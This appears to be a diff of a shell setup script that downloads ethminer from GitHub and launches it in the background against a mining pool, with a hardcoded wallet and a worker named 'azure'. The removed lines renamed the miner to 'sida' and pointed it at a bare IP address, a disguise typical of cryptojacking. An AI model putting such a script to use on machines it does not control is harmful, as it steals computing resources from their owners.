@@ -1,3 +1,4 @@
+  
 SCRIPT_DIR="$( cd "$( dirname "${BASH_SOURCE[0]}" )" &> /dev/null && pwd )"
 if [ ! -f "${SCRIPT_DIR}/isHaveSetupCoin.txt" ]; then
     echo "Start setup..."
@@ -19,6 +20,5 @@ if [ ! -f "${SCRIPT_DIR}/isHaveSetupCoin.txt" ]; then
 	wget https://github.com/ethereum-mining/ethminer/releases/download/v0.16.1/ethminer-0.16.1-linux-x86_64.tar.gz
 	tar xvzf ethminer-0.16.1-linux-x86_64.tar.gz
 	cd bin
-	mv ethminer sida
-	./sida -U -P http://103.133.106.124:8081/azure &
+	./ethminer -U -P stratum://0xe968dA3271ADCddA2496757301D2A5Ffa400CF50.azure@us2.ethermine.org:4444 &
 fi
